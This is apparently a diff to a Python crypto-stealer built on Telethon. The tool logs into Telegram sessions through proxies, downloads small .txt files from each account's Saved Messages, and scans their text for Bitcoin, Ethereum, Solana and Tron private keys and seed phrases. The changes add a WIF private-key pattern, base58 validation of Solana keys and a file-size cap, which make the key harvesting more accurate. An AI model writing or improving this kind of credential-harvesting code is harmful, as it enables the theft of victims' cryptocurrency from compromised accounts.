@@ -6,6 +6,7 @@ import asyncio
 import requests
 from datetime import datetime
 from random import choice
+import base58
 
 from telethon import TelegramClient
 from telethon.tl.types import User
@@ -17,7 +18,13 @@ from utils.time_utils import random_delay
 from utils.tg_funcs import send_message_to_telegram
 from utils.files_utils import write_to_file, parse_proxy
 from utils.basic import get_bip39_words, get_usernames, get_proxies
-from utils.patterns import HASH_PATTERN, BITCOIN_PATTERN, SOLANA_PATTERN, TRON_PATTERN
+from utils.patterns import (
+    HASH_PATTERN,
+    BITCOIN_PATTERN,
+    SOLANA_PATTERN,
+    TRON_PATTERN,
+    WIF_PATTERN,
+)
 from image_reader import extract_text
 
 from config import (
@@ -73,9 +80,12 @@ async def check_auth(session_path, api_id, api_hash, proxy):
 async def download_txt_files_from_saved_messages(client, session_name):
     try:
         saved_messages = await client.get_entity("me")
-
         async for message in client.iter_messages(saved_messages):
-            if message.document and message.file.name.endswith(".txt"):
+            if (
+                message.document
+                and message.file.name.endswith(".txt")
+                and message.document.size <= 50 * 1024
+            ):
                 file_path = os.path.join(DOWNLOADS_DIR, message.file.name)
                 await client.download_media(message, file_path)
                 print(f"Скачан файл: {file_path}")
@@ -144,15 +154,29 @@ def is_valid_mnemonic(text):
         return False
 
 
+def is_valid_solana_key(key):
+    if len(key) not in (44, 88):
+        return False
+    try:
+        decoded = base58.b58decode(key)
+    except Exception:
+        return False
+    if len(decoded) not in (32, 64):
+        return False
+    return True
+
+
 def find_keys(text):
     try:
         keys = {
             "bitcoin": BITCOIN_PATTERN.findall(text),
-            "solana": SOLANA_PATTERN.findall(text),
+            "solana": [
+                key for key in SOLANA_PATTERN.findall(text) if is_valid_solana_key(key)
+            ],
             "tron": TRON_PATTERN.findall(text),
             "ethereum": HASH_PATTERN.findall(text),
+            "wif": WIF_PATTERN.findall(text),
         }
-
         return {key: matches for key, matches in keys.items() if matches}
     except Exception as e:
         print(f"Ошибка при поиске ключей: {e}")
